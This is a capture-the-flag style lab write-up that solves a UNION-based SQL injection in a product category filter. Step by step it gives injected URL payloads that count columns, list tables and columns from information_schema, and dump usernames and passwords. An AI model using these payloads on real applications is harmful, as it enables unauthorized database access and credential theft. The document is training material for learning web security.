# SQL injection attack, listing the database contents on non-Oracle databases
# Objective
This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.\
\
The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.\
\
To solve the lab, log in as the administrator user.
# Solution

`/filter?category=Lifestyle’`—> Application is vulnerable 

## Determining the number of columns
`/filter?category=Lifestyle' order by 1--` \
`/filter?category=Lifestyle' order by 2--` \
`/filter?category=Lifestyle' order by 3--` -> Error -> Number of columns = 2

## Determining the types of columns
`/filter?category=Lifestyle' union select 'a','a'--` -> Both columns are string type \
`/filter?category=' union select table_name, null from information_schema.tables--` -> Listing tables

Target table name: `users_beinab`
## Listing column names in table
Listing column names in table `users_beinab`
```
/filter?category=' union select column_name, null from information_schema.columns where table_name='users_beinab'--
```
Retrieved column names: `username_qqtyzt`, `password_dumzqu`.

## Retrieving creadentials
```
/filter?category=' union select username_qqtyzt, password_dumzqu from users_beinab--
```

